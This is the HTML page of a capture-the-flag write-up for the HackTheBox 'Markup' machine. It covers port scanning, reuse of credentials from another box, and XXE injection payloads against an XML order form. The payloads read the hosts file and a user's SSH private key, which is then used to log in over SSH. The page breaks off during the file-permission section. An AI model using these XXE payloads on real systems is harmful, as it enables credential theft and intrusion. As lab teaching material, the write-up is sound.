@@ -1,0 +1,697 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Markup Writeup - SHAFIQAIMAN</title><meta name="Description" content="shafiqaiman.com is a cybersecurity/ethical hacking website that focus on publishing of writeup in HacktheBox, Tryhackme and other online CTF (capture the flag) challenge."><meta property="og:title" content="HackTheBox - Markup Writeup" />
+<meta property="og:description" content="Enumeration Top 1000 ports scan 1 nmap -sC -sV -oN nmap/initial 10.10.10.49 the result nmap initial scan All ports scan 1 nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49 the result nmap allports scan Open Ports Well, both the Nmap scan result are the same port 22/SSH port 80/HTTP port 443/HTTPs Webpage Let&rsquo;s take a look at the webpage HTTP login webpage Look&rsquo;s like just a regular login page. We can try to login with credentials we&rsquo;ve found from the previous box called Included Let&rsquo;s try it home webpage Success Now, time to enumerate/play around with this page." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://shafiqaiman.com/posts/htb/markup/" /><meta property="og:image" content="https://shafiqaiman.com/posts/htb/markup/featured.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-06T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-08-06T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://shafiqaiman.com/posts/htb/markup/featured.png"/>
+<meta name="twitter:title" content="HackTheBox - Markup Writeup"/>
+<meta name="twitter:description" content="Enumeration Top 1000 ports scan 1 nmap -sC -sV -oN nmap/initial 10.10.10.49 the result nmap initial scan All ports scan 1 nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49 the result nmap allports scan Open Ports Well, both the Nmap scan result are the same port 22/SSH port 80/HTTP port 443/HTTPs Webpage Let&rsquo;s take a look at the webpage HTTP login webpage Look&rsquo;s like just a regular login page. We can try to login with credentials we&rsquo;ve found from the previous box called Included Let&rsquo;s try it home webpage Success Now, time to enumerate/play around with this page."/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://shafiqaiman.com/posts/htb/markup/" /><link rel="prev" href="https://shafiqaiman.com/posts/htb/included/" /><link rel="next" href="https://shafiqaiman.com/posts/htb/guard/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Markup Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/shafiqaiman.com\/posts\/htb\/markup\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/shafiqaiman.com\/posts\/htb\/markup\/featured.png",
+                            "width":  1081 ,
+                            "height":  600 
+                        }],"genre": "posts","keywords": "xxe, xxe-read-file, icacls, checking-file-permission-windows","wordcount":  779 ,
+        "url": "https:\/\/shafiqaiman.com\/posts\/htb\/markup\/","datePublished": "2021-08-06T00:00:00+00:00","dateModified": "2021-08-06T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Markup Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="06-08-2021">06-08-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;779 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;4 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/markup/featured.png"
+        data-srcset="/posts/htb/markup/featured.png, /posts/htb/markup/featured.png 1.5x, /posts/htb/markup/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/markup/featured.png"
+        title="/posts/htb/markup/featured.png" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a>
+      <ul>
+        <li><a href="#open-ports">Open Ports</a></li>
+        <li><a href="#webpage">Webpage</a></li>
+        <li><a href="#order">Order</a></li>
+        <li><a href="#burpsuite">Burpsuite</a></li>
+      </ul>
+    </li>
+    <li><a href="#xxe-xml-external-entity-injection">XXE [XML External Entity Injection]</a>
+      <ul>
+        <li><a href="#new-entity">New Entity</a></li>
+        <li><a href="#read-file">Read File</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#ssh">SSH</a></li>
+        <li><a href="#user-flag">User Flag</a></li>
+        <li><a href="#log-management">Log-Management</a></li>
+        <li><a href="#checking-file-permission">Checking File Permission</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#ncexe">nc.exe</a></li>
+        <li><a href="#admin-flag">Admin Flag</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>Top 1000 ports scan</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -oN nmap/initial 10.10.10.49
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/nmap_1000.png" title="nmap initial scan" data-thumbnail="/posts/htb/markup/nmap_1000.png" data-sub-html="<h2>nmap initial scan</h2><p>nmap initial scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/nmap_1000.png"
+            data-srcset="/posts/htb/markup/nmap_1000.png, /posts/htb/markup/nmap_1000.png 1.5x, /posts/htb/markup/nmap_1000.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/nmap_1000.png" width="1042" height="793" />
+    </a><figcaption class="image-caption">nmap initial scan</figcaption>
+    </figure></p>
+<ul>
+<li>All ports scan</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.49
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/nmap_all_ports.png" title="nmap allports scan" data-thumbnail="/posts/htb/markup/nmap_all_ports.png" data-sub-html="<h2>nmap allports scan</h2><p>nmap allports scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/nmap_all_ports.png"
+            data-srcset="/posts/htb/markup/nmap_all_ports.png, /posts/htb/markup/nmap_all_ports.png 1.5x, /posts/htb/markup/nmap_all_ports.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/nmap_all_ports.png" width="1047" height="662" />
+    </a><figcaption class="image-caption">nmap allports scan</figcaption>
+    </figure></p>
+<h3 id="open-ports">Open Ports</h3>
+<ul>
+<li>Well, both the Nmap scan result are the same
+<ul>
+<li>port 22/SSH</li>
+<li>port 80/HTTP</li>
+<li>port 443/HTTPs</li>
+</ul>
+</li>
+</ul>
+<h3 id="webpage">Webpage</h3>
+<ul>
+<li>Let&rsquo;s take a look at the webpage <code>HTTP</code></li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/login.png" title="login webpage" data-thumbnail="/posts/htb/markup/login.png" data-sub-html="<h2>login webpage</h2><p>login webpage</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/login.png"
+            data-srcset="/posts/htb/markup/login.png, /posts/htb/markup/login.png 1.5x, /posts/htb/markup/login.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/login.png" width="999" height="798" />
+    </a><figcaption class="image-caption">login webpage</figcaption>
+    </figure></p>
+<ul>
+<li>Look&rsquo;s like just a regular login page.</li>
+<li>We can try to login with <code>credentials</code> we&rsquo;ve found from the <code>previous box</code> called <code>Included</code></li>
+<li>Let&rsquo;s try it</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/home.png" title="home webpage" data-thumbnail="/posts/htb/markup/home.png" data-sub-html="<h2>home webpage</h2><p>home webpage</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/home.png"
+            data-srcset="/posts/htb/markup/home.png, /posts/htb/markup/home.png 1.5x, /posts/htb/markup/home.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/home.png" width="1186" height="805" />
+    </a><figcaption class="image-caption">home webpage</figcaption>
+    </figure></p>
+<ul>
+<li>Success</li>
+<li>Now, time to <code>enumerate/play around</code> with this page.</li>
+</ul>
+<h3 id="order">Order</h3>
+<ul>
+<li>Well, I found out. We can order something on the <code>order page</code></li>
+<li>Let&rsquo;s try ordering something</li>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/order.png" title="order alerted" data-thumbnail="/posts/htb/markup/order.png" data-sub-html="<h2>order alerted</h2><p>order alerted</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/order.png"
+            data-srcset="/posts/htb/markup/order.png, /posts/htb/markup/order.png 1.5x, /posts/htb/markup/order.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/order.png" width="984" height="592" />
+    </a><figcaption class="image-caption">order alerted</figcaption>
+    </figure></p>
+<ul>
+<li>Every time a user orders something it&rsquo;s always <code>pop up this message</code>.</li>
+<li>Let&rsquo;s try check <code>how this form handle the request</code></li>
+</ul>
+<h3 id="burpsuite">Burpsuite</h3>
+<ul>
+<li>I&rsquo;m gonna <code>intercept</code> the request by using <code>burpsuite</code></li>
+<li>Then, send the request into <code>repeater tab</code></li>
+<li>I found this body kinda weird at first.</li>
+<li>It&rsquo;s <code>doesn't look</code> like any <code>JSON</code> data</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/xml.png" title="xml post data" data-thumbnail="/posts/htb/markup/xml.png" data-sub-html="<h2>xml post data</h2><p>xml post data</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/xml.png"
+            data-srcset="/posts/htb/markup/xml.png, /posts/htb/markup/xml.png 1.5x, /posts/htb/markup/xml.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/xml.png" width="633" height="491" />
+    </a><figcaption class="image-caption">xml post data</figcaption>
+    </figure></p>
+<ul>
+<li>Then, I realize this is <code>XML [Extensible Markup Language]</code></li>
+<li>Well, I heard something about <code>XML injection</code> before</li>
+<li>Let&rsquo;s try it</li>
+</ul>
+<h2 id="xxe-xml-external-entity-injection">XXE [XML External Entity Injection]</h2>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>An <code>XML External Entity</code> attack is a type of attack against an application that parses XML input. </br>
+This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. </br></p>
+<ul>
+<li>Wikipedia - <a href="https://en.wikipedia.org/wiki/XML_external_entity_attack" target="_blank" rel="noopener noreffer ">XML external entity attack</a></li>
+</ul>
+</div>
+        </div>
+    </div>
+<ul>
+<li>Source
+<ul>
+<li><a href="https://www.youtube.com/watch?v=gjm6VHZa_8s" target="_blank" rel="noopener noreffer ">[YouTube]PwnFunction - XML External Entities (Explained)</a></li>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#main-attacks" target="_blank" rel="noopener noreffer ">HackTricks - Xml External Entity</a></li>
+<li><a href="https://portswigger.net/web-security/xxe" target="_blank" rel="noopener noreffer ">Portswigger - XXE</a></li>
+</ul>
+</li>
+</ul>
+<h3 id="new-entity">New Entity</h3>
+<ul>
+<li>I&rsquo;m going to test if a simple <code>new ENTITY declaration</code> is working</li>
+<li>here&rsquo;s what the payload gonna looks like.</li>
+<li>Source
+<ul>
+<li><a href="https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity#main-attacks" target="_blank" rel="noopener noreffer ">HackTricks - Xml External Entity</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY example &#34;test&#34;&gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;stockCheck&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;productId&gt;</span><span class="ni">&amp;example;</span><span class="nt">&lt;/productId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/XML-test.png" title="xxe result" data-thumbnail="/posts/htb/markup/XML-test.png" data-sub-html="<h2>xxe result</h2><p>xxe result</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/XML-test.png"
+            data-srcset="/posts/htb/markup/XML-test.png, /posts/htb/markup/XML-test.png 1.5x, /posts/htb/markup/XML-test.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/XML-test.png" width="1263" height="674" />
+    </a><figcaption class="image-caption">xxe result</figcaption>
+    </figure></p>
+<ul>
+<li>it is working</li>
+</ul>
+<h3 id="read-file">Read File</h3>
+<ul>
+<li>Now, Let&rsquo;s try to <code>read a file with it</code></li>
+<li>So, I&rsquo;m gonna insert this command</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version = &#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;file:///c:/windows/system32/drivers/etc/hosts&#34;&gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;order&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;quantity&gt;</span>
+</span></span><span class="line"><span class="cl">        1
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/quantity&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="ni">&amp;example;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/item&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;address&gt;</span>
+</span></span><span class="line"><span class="cl">        Bed for sleeping of course
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/address&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/order&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/host.png" title="xxe read file" data-thumbnail="/posts/htb/markup/host.png" data-sub-html="<h2>xxe read file</h2><p>xxe read file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/host.png"
+            data-srcset="/posts/htb/markup/host.png, /posts/htb/markup/host.png 1.5x, /posts/htb/markup/host.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/host.png" width="1279" height="692" />
+    </a><figcaption class="image-caption">xxe read file</figcaption>
+    </figure></p>
+<ul>
+<li>Wow! It works</li>
+</ul>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<ul>
+<li>Remember this machine has <code>SSH open</code>.</li>
+<li>Let&rsquo;s try to read the <code>SSH private key</code></li>
+<li>Windows SSH key locate here: <code>C:\Users\USERNAME\.ssh\</code></li>
+</ul>
+<h3 id="ssh">SSH</h3>
+<ul>
+<li>I&rsquo;m gonna put this as a payload</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version = &#34;1.0&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE foo [&lt;!ENTITY example SYSTEM &#34;file:///c:/users/daniel/.ssh/id_rsa&#34;&gt;</span> ]&gt;
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;order&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;quantity&gt;</span>
+</span></span><span class="line"><span class="cl">        1
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/quantity&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;item&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="ni">&amp;example;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/item&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;address&gt;</span>
+</span></span><span class="line"><span class="cl">        Bed for sleeping of course
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/address&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/order&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/ssh-prikey.png" title="xxe read ssh key" data-thumbnail="/posts/htb/markup/ssh-prikey.png" data-sub-html="<h2>xxe read ssh key</h2><p>xxe read ssh key</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/ssh-prikey.png"
+            data-srcset="/posts/htb/markup/ssh-prikey.png, /posts/htb/markup/ssh-prikey.png 1.5x, /posts/htb/markup/ssh-prikey.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/ssh-prikey.png" width="628" height="780" />
+    </a><figcaption class="image-caption">xxe read ssh key</figcaption>
+    </figure></p>
+<ul>
+<li>WOW! we&rsquo;ve got the private key</li>
+<li>Let&rsquo;s copy it and try login with SSH</li>
+</ul>
+<div class="details admonition tip open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-lightbulb fa-fw" aria-hidden="true"></i>Tip<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Before we can log in. Make sure to change the permission of the key with the command
+<code>chmod 600 &lt;filename&gt;</code></div>
+        </div>
+    </div>
+<ul>
+<li>Now, Let&rsquo;s try login with this command</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i &lt;filename&gt; daniel@10.10.10.49
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/markup/ssh.png" title="ssh as daniel" data-thumbnail="/posts/htb/markup/ssh.png" data-sub-html="<h2>ssh as daniel</h2><p>ssh as daniel</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/ssh.png"
+            data-srcset="/posts/htb/markup/ssh.png, /posts/htb/markup/ssh.png 1.5x, /posts/htb/markup/ssh.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/ssh.png" width="550" height="268" />
+    </a><figcaption class="image-caption">ssh as daniel</figcaption>
+    </figure></p>
+<ul>
+<li>I&rsquo;m in</li>
+</ul>
+<h3 id="user-flag">User Flag</h3>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/user.png" title="user flag" data-thumbnail="/posts/htb/markup/user.png" data-sub-html="<h2>user flag</h2><p>user flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/user.png"
+            data-srcset="/posts/htb/markup/user.png, /posts/htb/markup/user.png 1.5x, /posts/htb/markup/user.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/user.png" width="534" height="307" />
+    </a><figcaption class="image-caption">user flag</figcaption>
+    </figure></p>
+<h3 id="log-management">Log-Management</h3>
+<ul>
+<li>Let&rsquo;s start to enumerate this machine</li>
+<li>I found kinda <code>sus</code> folder in the root directory
+<ul>
+<li><em><font color="yellow">maybe I don&rsquo;t know it&rsquo;s actually exists</font></em></li>
+</ul>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/log-manage.png" title="found Log-Management directory" data-thumbnail="/posts/htb/markup/log-manage.png" data-sub-html="<h2>found Log-Management directory</h2><p>found Log-Management directory</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/log-manage.png"
+            data-srcset="/posts/htb/markup/log-manage.png, /posts/htb/markup/log-manage.png 1.5x, /posts/htb/markup/log-manage.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/log-manage.png" width="633" height="430" />
+    </a><figcaption class="image-caption">found Log-Management directory</figcaption>
+    </figure></p>
+<ul>
+<li>The folder called <code>Log-Management</code></li>
+<li>Found the file name <code>job.bat</code> and see the content of that file</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/markup/job.png" title="contents inside job.bat file" data-thumbnail="/posts/htb/markup/job.png" data-sub-html="<h2>contents inside job.bat file</h2><p>contents inside job.bat file</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/markup/job.png"
+            data-srcset="/posts/htb/markup/job.png, /posts/htb/markup/job.png 1.5x, /posts/htb/markup/job.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/markup/job.png" width="752" height="388" />
+    </a><figcaption class="image-caption">contents inside job.bat file</figcaption>
+    </figure></p>
+<ul>
+<li>So, I&rsquo;m gonna assume this script for <code>clearing event log</code> and gonna <code>run automatically like UNIX cronjob</code></li>
+<li><code>¯\__(ツ)_/¯</code></li>
+</ul>
+<h3 id="checking-file-permission">Checking File Permission</h3>
+<ul>
+<li>
+<p>We can abuse this if we had the permission to change the content of the file</p>
+</li>
+<li>
+<p>Source</p>
+<ul>
+<li><a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/wevtutil" target="_blank" rel="noopener noreffer ">Microsoft - wevutils</a></li>
